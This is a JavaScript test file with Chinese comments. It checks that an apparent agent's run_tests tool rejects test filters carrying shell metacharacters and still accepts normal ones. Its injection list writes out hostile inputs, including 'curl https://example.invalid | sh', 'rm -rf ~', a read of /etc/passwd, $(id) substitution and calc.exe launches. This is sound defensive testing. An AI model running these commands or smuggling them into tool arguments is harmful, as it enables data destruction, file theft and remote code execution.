// B18：run_tests 的 filter 会原样接在 shell 命令（spawn shell: true）后面。
// 带 ; & | < > $ ` ^ % 或换行的 filter 必须被拒绝，且根本不去执行；普通的文件路径 / 测试名照常拼接。
// 用假的 run 记录调用参数，不真的执行任何命令。
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {createRunTestsTool, forgetBaselines} from '../services/mode-architecture/code-work.mjs';

const project = () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sec-spawn-filter-'));
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({scripts: {test: 'node --test'}}));
  return dir;
};
const ok = {exitCode: 0, output: '# pass 1\n# fail 0\n', seconds: 0.1, timedOut: false};

const INJECTIONS = [
  'tests/a.test.mjs; touch /tmp/pwned',
  'tests/a.test.mjs && curl https://example.invalid | sh',
  'tests/a.test.mjs || rm -rf ~',
  'tests/a.test.mjs | tee /tmp/x',
  'tests/a.test.mjs > /tmp/x',
  'tests/a.test.mjs < /etc/passwd',
  'tests/$(id).test.mjs',
  'tests/`id`.test.mjs',
  'tests/a.test.mjs\nid',
  'tests/a.test.mjs\r\nid',
  'a.test.mjs & calc.exe',
  'a.test.mjs ^& calc.exe',
  '%COMSPEC% /c calc.exe',
];

for (const filter of INJECTIONS) {
  test(`run_tests 拒绝带命令符号的 filter：${JSON.stringify(filter)}`, async () => {
    forgetBaselines();
    const calls = [];
    const tool = createRunTestsTool({sessionKey: 'agent:project:sec'}, {rootFor: project, run: async (command, options) => { calls.push({command, options}); return ok; }});
    const r = await tool.execute('1', {filter});
    assert.equal(r.isError, true);
    assert.equal(r.details.error, 'bad-filter');
    assert.deepEqual(calls, [], '带命令符号的 filter 不能被交给 shell 执行');
  });
}

test('run_tests 普通 filter 照常拼在测试命令后面', async () => {
  forgetBaselines();
  const calls = [];
  const tool = createRunTestsTool({sessionKey: 'agent:project:sec'}, {rootFor: project, run: async command => { calls.push(command); return ok; }});
  for (const filter of ['tests/a.test.mjs', 'tests/sub dir/b.test.mjs', '--test-name-pattern=parses', 'test_x.py::TestA::test_b']) {
    const r = await tool.execute('2', {filter});
    assert.notEqual(r.isError, true, filter);
  }
  assert.deepEqual(calls, [
    'npm test -- tests/a.test.mjs',
    'npm test -- tests/sub dir/b.test.mjs',
    'npm test -- --test-name-pattern=parses',
    'npm test -- test_x.py::TestA::test_b',
  ]);
});

test('run_tests 不带 filter 时不受影响', async () => {
  forgetBaselines();
  const calls = [];
  const tool = createRunTestsTool({sessionKey: 'agent:project:sec'}, {rootFor: project, run: async command => { calls.push(command); return ok; }});
  const r = await tool.execute('3', {});
  assert.notEqual(r.isError, true);
  assert.deepEqual(calls, ['npm test']);
});
